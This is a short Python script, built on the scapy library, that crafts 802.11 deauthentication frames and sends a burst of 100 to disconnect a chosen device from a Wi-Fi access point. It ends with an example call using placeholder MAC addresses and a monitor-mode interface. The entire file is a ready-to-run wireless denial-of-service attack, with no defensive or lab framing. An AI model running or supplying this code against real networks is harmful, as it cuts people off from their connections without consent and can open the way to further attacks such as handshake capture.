from scapy.all import *

def deauth(target_mac, ap_mac, interface):
    """
    Sends deauthentication packets to disconnect a target device from an AP.
    """
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(packet, iface=interface, count=100, inter=0.1, verbose=True)

# Example usage:
# deauth("AA:BB:CC:DD:EE:FF", "11:22:33:44:55:66", "wlan0mon")